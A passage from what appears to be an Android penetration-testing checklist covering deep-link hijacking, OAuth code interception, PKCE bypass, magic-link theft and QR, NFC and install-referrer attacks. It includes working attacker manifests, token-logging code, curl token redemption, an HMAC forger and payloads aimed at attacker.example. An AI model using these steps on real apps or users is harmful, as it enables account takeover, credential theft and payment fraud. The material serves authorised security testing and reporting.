- **How:** Add to `attacker-app/app/src/main/AndroidManifest.xml` (the permission block stays empty — that is
  the argument):
  ```xml
  <activity android:name=".LootActivity" android:exported="true"
            android:excludeFromRecents="true" android:taskAffinity=""
            android:theme="@android:style/Theme.NoDisplay">
    <intent-filter android:priority="999">
      <action android:name="android.intent.action.VIEW"/>
      <category android:name="android.intent.category.DEFAULT"/>
      <category android:name="android.intent.category.BROWSABLE"/>
      <data android:scheme="targetapp"/>
    </intent-filter>
  </activity>
  ```
  ```java
  // LootActivity.onCreate
  android.net.Uri u = getIntent().getData();
  android.util.Log.e("D09LOOT", "FULL=" + getIntent().getDataString());
  if (u != null) for (String k : u.getQueryParameterNames())
      android.util.Log.e("D09LOOT", k + " = " + u.getQueryParameter(k));
  finish();
  ```
  ```bash
  ./gradlew :app:assembleDebug && adb install -r attacker-app/app/build/outputs/apk/debug/app-debug.apk
  adb shell cmd package resolve-activity --brief -a android.intent.action.VIEW -d 'targetapp://auth/callback'
  adb shell pm query-activities -a android.intent.action.VIEW -d 'targetapp://auth/callback' | grep -E 'packageName|name='
  adb logcat -c && adb logcat -s D09LOOT:E
  # now run the REAL flow in the victim app, do not synthesise the URI
  ```
- **Proof:** Your app's logcat line containing the full callback URI with its live parameter values, captured
  during a real flow — not an `am start` you issued yourself. Include `pm query-activities` showing two
  handlers (the ambiguity is the mechanism) and a screen recording of the chooser or the silent win.
- **Escalation:** Authorization code → D09-028/-029; magic-link or reset token → D09-031 → D13; session
  identifier → D15 as the victim.
- **Ruled out when:** No custom scheme in the D09-006 table carries anything but non-secret navigation data —
  enumerate what each one actually receives, from the D09-012 hook, and show that the parameter set contains
  no token, code, identifier or state. "The scheme exists but we didn't see a token" is not a negative;
  hook it and enumerate.

### D09-027 · Unverified https host squat with a matching `pathPattern`

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1); `sensitive_data_exposure.weak_password_reset_implementation` family when the captured artefact is a reset token |
| **Attacker** | AM-03 |
| **Applies to** | any `http`/`https` BROWSABLE filter whose host is **not** `verified` per D09-014 |
| **Maps to** | MASTG-TEST-0393; the corpus's password-reset hijack write-up ("The reset domain does **not** publish an `assetlinks.json` file, and the official Android application does **not** define a matching `intent-filter`"); H1 #855618 |

- **Test:** An unverified https link is an ordinary implicit intent. Register the exact host and path pattern
  of the app's most sensitive link — password reset, magic login, invite acceptance, payment confirmation —
  and see whether your app appears in the chooser when the victim taps the emailed link.
- **How:**
  ```xml
  <activity android:name=".HijackToken" android:exported="true">
    <intent-filter>
      <action android:name="android.intent.action.VIEW"/>
      <category android:name="android.intent.category.BROWSABLE"/>
      <category android:name="android.intent.category.DEFAULT"/>
      <data android:scheme="https"/>
      <data android:host="auth.target.example"/>
      <data android:pathPattern="/password_reset/.*"/>
    </intent-filter>
  </activity>
  ```
  ```bash
  adb shell pm get-app-links com.target.app | grep -F auth.target.example    # must NOT say verified
  adb install -r attacker.apk
  adb shell cmd package resolve-activity --brief -a android.intent.action.VIEW -d 'https://auth.target.example/password_reset/AAA'
  # then trigger a real reset email and tap the link from the mail client
  adb logcat -s D09LOOT:E
  ```
- **Proof:** The chooser containing your app for the victim's real reset URL (screen recording), your logcat
  line with the single-use token, and the reset **completed** in a browser with that token. Do not stop at
  possession of the string.
- **Escalation:** → D13 full ATO. The downstream impact argument that survived triage in the corpus:
  "unauthorized transactions, misuse saved payment methods, or drain loyalty and rewards points."
- **Ruled out when:** `pm get-app-links` reports the host `verified` on every device in the app's supported
  API range, in which case the OS refuses to offer your app and the chooser never appears — record the
  attempted resolve and the resulting single-candidate output. Note that a **verified** host closes this item
  but not D09-055 (path scope).

### D09-028 · OAuth authorization-code interception over a custom-scheme redirect

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_security_misconfiguration.oauth_misconfiguration.account_takeover` (P2); escalate to `broken_authentication_and_session_management.authentication_bypass` (P1) once you complete the takeover |
| **Attacker** | AM-03 |
| **Applies to** | every app whose OAuth/OIDC `redirect_uri` is a private-use URI scheme rather than a claimed https redirect |
| **Maps to** | RFC 8252 ("multiple apps can typically register the same scheme, making it indeterminate as to which app will receive the authorization code"; native public clients MUST implement PKCE); ATT&CK T1635, T1635.001 (mitigation M1013: "Implement Android App Links and iOS Universal Links for secure URI binding" and "Adopt PKCE … to prevent stolen authorization code misuse"); Google Mobile VRP class "Leaking OAuth tokens"; Oversecured ("For OAuth flows: always use App Links, never custom schemes") |

- **Test:** Extract the real `redirect_uri` from the `/authorize` request in the proxy (not from the manifest —
  they differ), confirm it is a custom scheme, then squat it and capture `?code=`. The *finding* is the
  redemption, not the capture.
- **How:**
  ```bash
  # 1. observe the real flow
  grep -rn -iE 'redirect_uri|response_type|client_id|code_challenge|code_verifier|AppAuth|net\.openid\.appauth|CustomTabsIntent' out/sources/ | head -40
  # in Burp: capture GET /authorize?...&redirect_uri=com.target.app:/oauth2redirect&response_type=code...
  # 2. confirm the scheme is claimable
  adb shell pm query-activities -a android.intent.action.VIEW -d "com.target.app:/oauth2redirect" | grep -E 'packageName|name='
  # 3. squat it (D09-026 manifest, scheme="com.target.app"), reinstall, re-run login
  adb logcat -s D09LOOT:E
  # 4. redeem, from curl, with no code_verifier
  curl -s -X POST https://auth.target.example/oauth/token \
    -d grant_type=authorization_code -d code="$CODE" -d client_id="$CID" -d redirect_uri="com.target.app:/oauth2redirect"
  ```
- **Proof:** Your app's log line with a live `code=` value captured from the victim's authorisation, then a
  `200` from the token endpoint carrying an `access_token`, then one authenticated API call made with it
  showing the victim's data. If PKCE is enforced, the redemption fails with `invalid_grant` — **record that
  as the mitigating control** and drop to D09-029 rather than filing an unexploitable interception.
- **Escalation:** → D13 account takeover; → D15 to demonstrate data access rather than token possession.
  Chain-file it: the interception primitive and the PKCE weakness are separate fix surfaces.
- **Ruled out when:** The redirect is an https App Link whose host reports `verified` (RFC 8252's preferred
  form), **or** the token endpoint rejects the code without a matching `code_verifier` (D09-029) — in which
  case the capture is real but the impact is not, and the honest rating is High/Medium for the leak of the
  code and `state`, not Critical. The corpus records exactly this negative on a real target: "Amazon Pay OAuth
  uses PKCE" — write yours the same way.

### D09-029 · PKCE not enforced at the token endpoint (the reportable half)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `server_security_misconfiguration.oauth_misconfiguration.account_takeover` (P2) when combined with an interception path; the PKCE gap alone is the control failure |
| **Attacker** | AM-03 (the interceptor), AM-01 against the authorisation server |
| **Applies to** | every mobile OAuth public client |
| **Maps to** | RFC 8252; draft-ietf-oauth-security-topics §2.1.1 (MUST use PKCE; MUST mitigate PKCE downgrade); the corpus's never-submit note: **"OAuth `client_secret` in a mobile app" is known and expected and must not be submitted — PKCE non-enforcement is the reportable finding instead** |

- **Test:** PKCE is only a control if the server enforces it. Four probes, in order.
- **How:**
  ```bash
  # 1. does the client even send a challenge?
  grep -rnE 'code_challenge|code_verifier|S256|CodeVerifierUtil|generateRandomCodeVerifier' out/sources/ | head
  # 2. omit the verifier entirely at exchange
  curl -s -X POST https://auth.target.example/oauth/token \
    -d grant_type=authorization_code -d code="$CODE" -d client_id="$CID" -d redirect_uri="$RURI"
  # 3. send a WRONG verifier
  curl -s -X POST https://auth.target.example/oauth/token \
    -d grant_type=authorization_code -d code="$CODE2" -d client_id="$CID" -d redirect_uri="$RURI" -d code_verifier=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  # 4. plain downgrade: request with code_challenge_method=plain and challenge==verifier
  ```
- **Proof:** A token issued in probe 2 or 3. Note the layer-ordering discipline: a `400
  "code_verifier is required"` does **not** prove the server validates it — re-run with a well-formed but
  wrong verifier (probe 3) before claiming enforcement either way.
- **Escalation:** On its own this is the control failure; combined with D09-026/-028 it is the complete ATO
  chain. File the two separately and cross-reference (D09-080).
- **Ruled out when:** Probes 2, 3 and 4 all fail with `invalid_grant`, tested against a **freshly issued**
  code each time (codes are often single-use, so a reused code fails for the wrong reason — that is the
  server-policy-versus-state trap). Show three distinct codes and three responses.

### D09-030 · Predictable PKCE code verifier

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `server_security_misconfiguration.oauth_misconfiguration.account_takeover` (P2) |
| **Attacker** | AM-03 |
| **Applies to** | apps doing Authorization Code + PKCE natively (RFC 8252) |
| **Maps to** | Google Mobile VRP auditing tip, verbatim: "Implicit grant is always bad; If using Authz flow, check for PKCE use; If using PKCE, check that it is not predictable"; the corpus's disclosed Superhuman/Grammarly "Authorization Code with PKCE flow implementation vulnerability that allows account takeover" |

- **Test:** PKCE protects a code only if the verifier is unguessable. `java.util.Random`, `Math.random()`,
  a time-seeded generator, a fixed string, or a verifier derived from a device identifier all make an
  intercepted code redeemable by the interceptor.
- **How:**
  ```bash
  grep -rn -B6 -A10 'code_verifier\|codeVerifier\|generateRandomCodeVerifier\|CodeVerifierUtil' out/sources/ \
    | grep -nE 'new Random\(|Math\.random|System\.currentTimeMillis|nanoTime|UUID\.randomUUID|SecureRandom|ANDROID_ID|Settings\.Secure'
  ```
  `SecureRandom` with a default seed is correct; `new Random(System.currentTimeMillis())` is not. Then
  confirm at runtime by collecting verifiers across repeated logins:
  ```javascript
  Java.perform(function () {
    var M = Java.use('net.openid.appauth.internal.UriUtil');   // or the app's own helper class
    // hook the actual generator you found in jadx and print its output
  });
  ```
  Collect at least ten and check entropy: identical prefixes, monotonic values or a 32-bit space is the
  finding.
- **Proof:** The generator source quoted, plus ten sampled verifiers showing structure — then a redemption of
  an intercepted code using a verifier you predicted, not one you captured.
- **Escalation:** → D09-028 (interception becomes redeemable again despite PKCE); → D12 for the wider
  randomness review.
- **Ruled out when:** The verifier comes from `SecureRandom` with no explicit seed and at least 32 bytes of
  output, and ten samples show full entropy. Quote the constructor.

### D09-031 · Magic-link / one-tap-login token interception

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | any app with emailed/SMS'd login links, invite links, or "continue on your phone" flows |
| **Maps to** | MASTG risk `unsafe-use-of-deeplinks`, which cites H1 **#855618** "Account Takeover via Magic Link Interception"; H1 #855618 (Shopify Arrive) |

- **Test:** Find every flow that mints a bearer credential into a URL, then check whether that URL travels on
  a class (b) or class (c) entry point from the D09-006 table. If it does, it is interceptable.
- **How:**
  ```bash
  grep -rnE 'getQueryParameter\("(token|authToken|auth_token|jwt|code|session|sid|access_token|id_token|magic|otp|nonce|invite)"\)' out/sources/
  grep -rnE 'magic|passwordless|one_?tap|verify_?token|login_?link|sign_?in_?link' out/sources/ | head -30
  # and the emitted side — what does the backend put in the email?
  # trigger the flow yourself and read the link out of the mailbox
  ```
  Register the matching filter (D09-026 or D09-027), trigger the flow against your own second account, and
  capture. Then the step that makes it a finding:
  ```bash
  curl -s -X POST https://api.target.example/auth/magic/verify -H 'content-type: application/json' \
       -d "{\"token\":\"$CAPTURED\"}" -i | head -20
  ```
- **Proof:** The five-screenshot state-change set (D09-079): pre-state (you are logged out), the capture, the
  redemption returning a session, the session performing an authenticated read as the victim, and the
  victim's inbox showing whether any notification fired. The proof is the session, not the token string.
- **Escalation:** → D13. Pre-empt the "requires a malicious app" downgrade by showing your app can also
  **trigger the email itself**, which removes the wait-for-the-user precondition.
- **Ruled out when:** The login link is delivered only to a `verified` App Link host and the token is
  single-use, short-lived and bound to the requesting device/session — demonstrate the binding by redeeming a
  captured token from a second device and showing it fails.

### D09-032 · `android:priority` is capped — do not claim a priority win

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — false-positive prevention on every squat claim |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | `guide/topics/manifest/intent-filter-element`, verbatim: "In certain circumstances the requested priority is ignored and the value is capped to 0. This occurs when: A non-privileged application requests any priority >0. A privileged application requests a priority >0 for `ACTION_VIEW`, `ACTION_SEND`, `ACTION_SENDTO` or `ACTION_SEND_MULTIPLE`." |

- **Test:** Half the public write-ups say "register with `android:priority="999"` and you win". A
  non-privileged third-party app **cannot** win by priority — the framework caps it to 0 for exactly these
  actions. Your hijack works because you are the only handler, because the chooser appears and the user picks
  you, or because the victim set a default. Report the path that actually works, or triage will close the
  report on this sentence alone.
- **How:**
  ```bash
  adb shell dumpsys package com.attacker.probe | grep -i priority
  adb shell cmd package resolve-activity --brief -a android.intent.action.VIEW -d "https://target.example/x"
  adb shell pm query-activities -a android.intent.action.VIEW -d "targetapp://auth/callback"
  ```
- **Proof:** `resolve-activity` naming the resolver/chooser (`android/…ResolverActivity`) rather than a single
  component, or naming your stub only after the user has selected it once. Screenshot the chooser and state
  which of the three win conditions your PoC relies on.
- **Escalation:** n/a — this item exists to stop you writing a claim the platform documentation refutes.
  `android:order` (API 28+) only disambiguates *within one app*, not across apps — it does not help you either.
- **Ruled out when:** n/a — apply this framing to every squat finding you file.

### D09-033 · Android 12+ web-intent resolution, and the custom scheme added to work around it

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | consequence-rated; the workaround scheme is a class (c) entry point |
| **Attacker** | AM-03 (app-to-app), AM-02 (the link that starts the flow) |
| **Applies to** | Android 12 (API 31)+ for resolution behaviour; the manifest issue is universal |
| **Maps to** | `developer.android.com/about/versions/12/behavior-changes-12` and `.../behavior-changes-all` (web intent resolution: a generic web intent resolves to the app only if the app is approved for that domain); **CVE-2024-45240** (TikTok Lynxview deep-link traversal, "only exploitable by third-party applications" on Android 12 and later) |

- **Test:** Two consequences of the Android 12 change that testers get backwards. (1) An unverified https link
  no longer routes from the browser to the app, so a browser-delivered hijack PoC that worked on Android 11
  does **not** work on 12+ — the hijack becomes app-to-app, which is AM-03 and a different rating. (2) Apps
  that lost their implicit https capture frequently bolted on a **custom scheme** to keep the flow working,
  and that scheme has no verification at all. Find the workaround; it is usually newer than the https filter.
- **How:**
  ```bash
  adb shell pm get-app-links com.target.app
  adb shell dumpsys package domain-preferred-apps | grep -A6 com.target.app
  grep -nB3 -A8 '<data android:scheme=' out/AndroidManifest.merged.xml
  # diff an older release against the current one: which scheme appeared, and when?
  diff <(grep -ohE 'android:scheme="[^"]+"' old/AndroidManifest.xml | sort -u) \
       <(grep -ohE 'android:scheme="[^"]+"' out/AndroidManifest.merged.xml | sort -u)
  # and test BOTH delivery paths on BOTH API levels
  adb -s emulator-5554 shell am start -a android.intent.action.VIEW -d 'https://app.target.example/auth?token=X'   # API < 31
  adb -s emulator-5556 shell am start -a android.intent.action.VIEW -d 'https://app.target.example/auth?token=X'   # API >= 31
  ```
- **Proof:** `pm get-app-links` showing the https host unverified **while** a custom scheme in the manifest
  reaches the same handler — so the sensitive route is claimable by any app regardless of the platform
  hardening. State which delivery path (browser or installed app) works on which API level; a finding with no
  stated platform version is a finding the vendor closes for free.
- **Escalation:** The workaround scheme goes straight to D09-026/-028.
- **Ruled out when:** No custom scheme reaches the same handler as the https filter, and the https host is
  `verified`. Show both the scheme diff and the verification state.

### D09-034 · Scheme collision across every app that embeds the same SDK

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `server_security_misconfiguration.oauth_misconfiguration.account_takeover` (P2) when the intercepted value is an OAuth artefact |
| **Attacker** | AM-03, AM-08 |
| **Applies to** | custom schemes contributed by a shared SDK; **not** verified App Links |
| **Maps to** | Google Play ASI "Scheme Hijacking" campaign (started 2018-11-15); Oversecured SDK-security post; ASI "Embedded Facebook OAuth Token" / "Embedded Foursquare OAuth Token" campaigns (both started 2016-09-28) for the adjacent hardcoded-credential case |

- **Test:** When an SDK registers a fixed scheme rather than a per-app one, every app embedding that SDK
  claims the same scheme — so a *legitimate* co-installed app can receive another app's callback, and a
  malicious app trivially can. Check whether the scheme is app-scoped (reverse-DNS, or suffixed with the
  client id) or SDK-global.
- **How:**
  ```bash
  # who else on the device claims it?
  adb shell pm query-activities -a android.intent.action.VIEW -d "<sdkscheme>://x" | grep -E 'packageName|name='
  adb shell dumpsys package r | grep -n -A5 "Scheme: \"<sdkscheme>\""
  # is it app-scoped?
  grep -ohE 'android:scheme="[^"]+"' out/AndroidManifest.merged.xml | cut -d'"' -f2 \
    | awk '{print length($0), $0}' | sort -n     # short generic names (pay, auth, myapp) are the smell
  ```
  Then install a second app (a public one from the same SDK ecosystem, or your stub) declaring the identical
  scheme and re-run the login flow.
- **Proof:** `pm query-activities` returning more than one package, followed by the disambiguation chooser, or
  your stub receiving the callback URI with the `code`/`access_token` extra logged.
- **Escalation:** → D09-028 → D13; → D18 for the SDK's own configuration; report the scheme scoping to the
  SDK vendor as well as the client.
- **Ruled out when:** The scheme is app-scoped (reverse-DNS of an owned domain, or contains the client id)
  and `pm query-activities` returns exactly one handler on a device with the ecosystem's other apps
  installed. Name the apps you installed for the test.

### D09-035 · Deferred deep links from an attribution SDK — a router input the OS never validated

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on the router sink reached) |
| **Attacker** | AM-09 (the SDK's backend or whoever controls the link record), AM-02 |
| **Applies to** | all apps bundling Branch, AppsFlyer, Adjust, Kochava, Firebase Dynamic Links or a similar MMP |
| **Maps to** | no external identifier verified for this exact path in the corpus — the corpus covers exported install-referrer *receivers*, not the deferred-deep-link callback. Report it on mechanism, with the SDK's own documentation as the reference |

- **Test:** A deferred deep link never travels as an `Intent`. The SDK resolves it server-side (or from the
  install referrer, the clipboard, or a device-fingerprint match) on first open and hands the app a URI, which
  the app feeds to its own router. That path bypasses App Links verification entirely — there is no host to
  verify. Test whether the router treats the SDK-supplied value as trusted, and whether it takes a *different,
  more permissive* branch than the intent path.
- **How:**
  ```bash
  grep -rnE 'io\.branch|com\.appsflyer|com\.adjust\.sdk|Kochava|FirebaseDynamicLinks|getDynamicLink' out/sources/ | head
  grep -rnE 'onDeepLinking|onInstallConversionDataLoaded|onAppOpenAttribution|initSession|BranchUniversalObject|\+clicked_branch_link|deep_link_value|af_dp|af_deeplink' -A25 out/sources/ \
    | grep -nE 'startActivity|parseUri|loadUrl|Uri\.parse|route\(|navigate\('
  ```
  Then substitute your own value at the callback boundary:
  ```javascript
  Java.perform(function () {
    // AppsFlyer shape
    var R = Java.use('com.appsflyer.deeplink.DeepLinkResult');
    R.getDeepLink.implementation = function () {
      var d = this.getDeepLink();
      console.log('[orig] ' + d.toString());
      return d;                       // read it first, then patch the backing map to your URI and re-run
    };
    // Branch shape: hook the BranchReferralInitListener onInitFinished(JSONObject, BranchError)
  });
  ```
  The SDK also usually resolves the link over **its own** HTTP stack, outside the app's pinning — check that
  path too (D14).
- **Proof:** A URI you injected at the SDK callback (`targetapp://webview?url=https://attacker.example/`, or
  a state-changing route) reaching the same router sink as a verified App Link — screen-record the navigation
  or capture the resulting API call in the proxy.
- **Escalation:** → D09-059 / D09-065 sinks; → D14 for the SDK's unpinned resolution channel; → D18.
- **Ruled out when:** The SDK callback's value is passed through the same validator as the intent path (read
  the code and say so), or the app ignores the deferred value entirely. Quote the callback body.

### D09-036 · `INSTALL_REFERRER` payload trusted for routing or entitlement

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) for the routing case; the entitlement case is a business-logic finding — file the consequence |
| **Attacker** | AM-01 (anyone who can construct the referring URL) |
| **Applies to** | all; any targetSdk |
| **Maps to** | `com.android.installreferrer` / `InstallReferrerClient` / `ReferrerDetails`; no external vulnerability identifier verified in the corpus for the trusted-payload question |

- **Test:** The Play install-referrer string is whatever the referring URL said — fully attacker-controlled,
  delivered before any authentication, and never attested. Apps use it for referral bonuses, free-trial
  grants, A/B bucket assignment and first-open routing. The question is not whether the receiver is exported;
  it is whether the *server* grants anything on the strength of a referrer the client reports.
- **How:**
  ```bash
  grep -rnE 'com\.android\.installreferrer|InstallReferrerClient|getInstallReferrer|ReferrerDetails|INSTALL_REFERRER' out/sources/
  # on a fresh install, deliver an arbitrary referrer
  adb shell pm clear com.target.app
  adb shell am broadcast -a com.android.vending.INSTALL_REFERRER \
    -n com.target.app/<the.referrer.Receiver> \
    --es referrer 'utm_source=x&referrer_code=VICTIMCODE&promo=STAFF100&bucket=premium&deep_link_value=targetapp%3A%2F%2Fwebview%3Furl%3Dhttps%3A%2F%2Fattacker.example%2F'
  ```
  Then watch the wire, not the screen.
- **Proof:** The referrer string reappearing verbatim in an `/attribution` or `/referral/claim` request, and
  the response granting credit, a trial or a tier — a balance delta or an entitlement flag flip on a
  brand-new account. For the routing case, the embedded URI reaching the router sink.
- **Escalation:** → D23 payments and entitlement fraud (self-referral at scale is direct financial loss);
  → D09-059 when the referrer carries a routable URI; the recommended control is server-side attestation
  (Play Integrity / Firebase App Check), which belongs in the remediation (D18).
- **Ruled out when:** The referrer is only sent to analytics and never appears in a request whose response
  grants anything, and no referrer field reaches `Uri.parse`/the router. Show the outbound request and the
  response.

### D09-037 · QR / barcode scan treated as a trusted deep-link source

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | consequence-rated; `broken_access_control.exposed_sensitive_android_intent` (null) at minimum, P1 `authentication_bypass` when the scan completes a login or account link |
| **Attacker** | AM-02 (a printed sticker over a legitimate code — no malware, no permissions) |
| **Applies to** | any app with a scanner: payments/UPI, ticketing, delivery, "scan to pair", loyalty, device onboarding |
| **Maps to** | `developers.google.com/ml-kit/vision/barcode-scanning/android` — `BarcodeScanning.getClient()`, `Barcode.getRawValue()`, `getValueType()`, `getUrl()`, `getWifi()`, `Barcode.FORMAT_QR_CODE`, and the permission-less "Google code scanner" module; the page carries **no validation guidance**, which is why most integrations pass the raw value through |

- **Test:** A scanner is an unauthenticated physical-world input channel that usually terminates in the app's
  most powerful sinks: the deep-link router, the WebView, "add device", "pay to", or Wi-Fi join. Trace
  `getRawValue()` to its sink and see what an attacker-printed code reaches.
- **How:**
  ```bash
  grep -rnE 'BarcodeScanning\.getClient|BarcodeScannerOptions|GmsBarcodeScanning|Barcode\.(FORMAT_QR_CODE|TYPE_URL|TYPE_WIFI)|getRawValue\(\)|getDisplayValue\(\)|getUrl\(\)|getWifi\(\)|ZXing|MultiFormatReader|decodeWithState' out/sources/
  grep -rn 'getRawValue()' -A20 out/sources/ | grep -nE 'Uri\.parse|Intent\.parseUri|startActivity|loadUrl|WifiNetworkSuggestion|addNetwork|connect\(|pay\(|linkDevice'
  ```
  ```bash
  qrencode -o poc1.png 'targetapp://webview?url=https://attacker.example/x'
  qrencode -o poc2.png 'intent://x#Intent;scheme=targetapp;S.url=file:///data/data/com.target.app/;end'
  qrencode -o poc3.png 'WIFI:T:WPA;S:FreeAirportWiFi;P:attackerpsk;;'
  qrencode -o poc4.png 'upi://pay?pa=attacker@bank&am=500&cu=INR'
  ```
  Display each on a second screen and scan it with the app.
- **Proof:** Screen recording of the scan and the resulting action — the WebView loading your origin, the
  payment sheet pre-filled with your payee, the Wi-Fi join dialog. The decisive proof is the sink executing
  **without an intermediate confirmation that names the destination**.
- **Escalation:** Everything downstream of a deep link now has a physical delivery path that works on a
  link-suspicious victim. → D09-059, D09-065, D23.
- **Ruled out when:** The scanner restricts by `getValueType()` and validates the decoded URI against the same
  allow-list as the intent path, or the scan result is only ever displayed for the user to confirm with the
  destination shown. Quote the validation.

### D09-038 · NFC tag as the delivery vehicle

| | |
|---|---|
| **Severity ceiling** | High (inherits the deep-link finding it delivers, plus one notch of realism) |
| **VRT** | consequence-rated |
| **Attacker** | AM-02 variant — one physical tap, no browser, no link, no install prompt |
| **Applies to** | NFC-capable devices. Pre-Android-16 the app must declare an NFC filter; **Android 16+** an `http(s)` tag triggers `ACTION_VIEW`, which reaches ordinary BROWSABLE/App-Link filters even if the app declares no NFC filter |
| **Maps to** | `developer.android.com/develop/connectivity/nfc/nfc` — dispatch priority `ACTION_NDEF_DISCOVERED` > `ACTION_TECH_DISCOVERED` > `ACTION_TAG_DISCOVERED`; AAR precedence ("If no Activity matches the AAR, or multiple Activities handle the intent, start the application specified by the AAR… If the application isn't installed, launch Google Play to download it"); "Starting in Android 16, scanning NFC tags that store web links (URI scheme `http://` or `https://`) triggers `ACTION_VIEW` instead"; `ACTION_TAG_DISCOVERED` is **deprecated starting Android 17 (API 37)** |

- **Test:** A printed tag costs cents and works on a victim who would never tap a link. Check whether the app
  registers `ACTION_NDEF_DISCOVERED` for its own scheme, and — on Android 16+ — whether its BROWSABLE https
  filters are now reachable from a tag without any NFC declaration at all.
- **How:**
  ```bash
  grep -nE 'android.nfc.action.(NDEF_DISCOVERED|TECH_DISCOVERED|TAG_DISCOVERED)' -A10 out/AndroidManifest.merged.xml
  adb shell getprop ro.build.version.sdk
  ```
  Write a tag (or emulate the dispatch if you have none):
  ```java
  new NdefMessage(new NdefRecord[]{
      NdefRecord.createUri("targetapp://pay?to=attacker&amt=1000"),
      NdefRecord.createApplicationRecord("com.target.app")});
  ```
  ```bash
  adb shell am start -a android.nfc.action.NDEF_DISCOVERED -d "targetapp://pay?to=attacker" -n com.target.app/.NfcActivity
  adb logcat -d | grep -iE 'NfcDispatch|NDEF_DISCOVERED|START u0 .*com\.target'
  ```
- **Proof:** Video of the physical tap and the routed screen, plus the dispatch line in logcat. State which
  path your PoC used — the declared NFC filter, or the Android 16 `http(s)`→`ACTION_VIEW` path.
- **Escalation:** → D08 if the routed URI carries a nested intent; → D09-059 if it lands in a WebView;
  → D25 for the wider accessory/physical surface.
- **Ruled out when:** The app declares no NFC intent filter **and** the device under test is below Android 16
  **and** no BROWSABLE `http(s)` filter exists. On Android 16+ the last condition is the only one that holds —
  say which device release you tested on.

### D09-039 · Notification-origin trust signature on privileged deep-link routes

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); P1 `authentication_bypass` when the trusted path skips an auth gate |
| **Attacker** | AM-02 (a web link carrying a forged signature) |
| **Applies to** | apps that gate deep-link routes on a notification-origin signature |
| **Maps to** | the corpus's worked example: a trampoline activity verifying a `pn_trust_sig` HMAC on links delivered via FCM, with the key resolvable from the APK |

- **Test:** Some routers unlock a privileged route set only when the link "came from a notification", proven
  by a signature parameter. The question is where the signing key lives. If it is in the APK, the trust
  boundary is decorative and any web link can claim notification origin.
- **How:**
  ```bash
  grep -rnE 'trust_sig|pn_trust|signature|sig=|hmac|Mac\.getInstance|verifySignature' out/sources/ \
    | grep -iE 'deeplink|trampoline|notif|route|uri' | head -30
  # find the key source
  grep -rn -B5 -A15 'Mac\.getInstance\|SecretKeySpec' out/sources/ | grep -nE '"[A-Za-z0-9+/=]{16,}"|BuildConfig\.|getString\(R\.string'
  # then self-sign
  python3 - <<'PY'
  import hmac, hashlib, base64
  key = b'<recovered key>'
  payload = 'targetapp://admin/route?x=1'
  print(base64.urlsafe_b64encode(hmac.new(key, payload.encode(), hashlib.sha256).digest()).decode())
  PY
  adb shell am start -a android.intent.action.VIEW -d 'targetapp://admin/route?x=1&pn_trust_sig=<yours>' com.target.app
  ```
- **Proof:** A self-signed deep link accepted on the trusted path — a route normally reachable only from a
  push notification now reachable from a plain web link. Show the same URI **without** the signature being
  rejected; that contrast is the proof the gate exists and that you passed it.
- **Escalation:** → D24 push/messaging (a leaked FCM server key lets you send the notification itself);
  → D12 for the hardcoded key; → D09-066 for what the unlocked routes do.
- **Ruled out when:** The signature is verified against a key fetched at runtime and bound to the user's
  session, or the "trusted" route set performs nothing the untrusted set cannot. Enumerate both route sets.

### D09-040 · Retired routes that still resolve: pinned shortcuts and instant-app-era paths

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); P1 `authentication_bypass` when the retired path skips an auth step |
| **Attacker** | AM-04 (launcher/shortcut access), AM-02 for the instant-app path |
| **Applies to** | `ShortcutManager` from API 25+; the instant-app case applies to any app that ever shipped a Google Play Instant experience |
| **Maps to** | `developer.android.com/develop/ui/views/launch/shortcuts/managing-shortcuts` — there is **no limit on pinned shortcuts**, `updateShortcuts()` can update pinned shortcuts "even after they're removed as dynamic shortcuts", pinned shortcuts are restored automatically after reinstall, and `disableShortcuts()` is the retirement API; `developer.android.com/topic/google-play-instant/overview` (discontinuation and the restricted API/permission subset) |

- **Test:** Two retired-route classes nobody tests, because the tester upgrades the app by reinstalling —
  which is exactly what preserves the artefact. (1) A pinned shortcut carries a frozen `Intent` from the
  version at which it was pinned; if routing changed without `updateShortcuts()`/`disableShortcuts()`, the old
  intent fires into the new code. (2) Instant experiences were launched by URL, so the installed app usually
  still declares those URL patterns — and their handlers were written for a permission-light,
  unauthenticated instant context.
- **How:**
  ```bash
  # shortcuts
  adb shell dumpsys shortcut | sed -n '/com.target.app/,/^  [A-Za-z]/p'
  adb shell cmd shortcut get-shortcuts 0 com.target.app
  grep -rnE 'requestPinShortcut|pushDynamicShortcut|setDynamicShortcuts|updateShortcuts|disableShortcuts|setLongLived' out/sources/ out/res/xml/
  # pin on version N, install N+1, re-fire the frozen intent
  adb shell am start -n com.target.app/<targetClass from the dump> --es <old extra> <old value>
  # instant-app remnants
  grep -rn 'dist:instant\|targetSandboxVersion\|InstantApps\|isInstantApp' out/AndroidManifest.merged.xml out/sources/ | head
  grep -nE 'android:host=|android:pathPrefix=' out/AndroidManifest.merged.xml | sort -u
  adb shell am start -a android.intent.action.VIEW -d 'https://target.example/<instant-era-path>'
  ```
- **Proof:** The old intent (or instant-era path) resolving to a code path the current UI cannot reach — an
  onboarding, debug, or skip-verification screen — with the `dumpsys shortcut` extras or the manifest path
  pattern quoted as the source of the route.
- **Escalation:** Retired-path reachability that skips an auth step is an authentication bypass → D13; the
  identifiers in shortcut extras feed a D15 IDOR probe.
- **Ruled out when:** Pinned shortcut intents resolve to the same guarded screens as the live UI (compare the
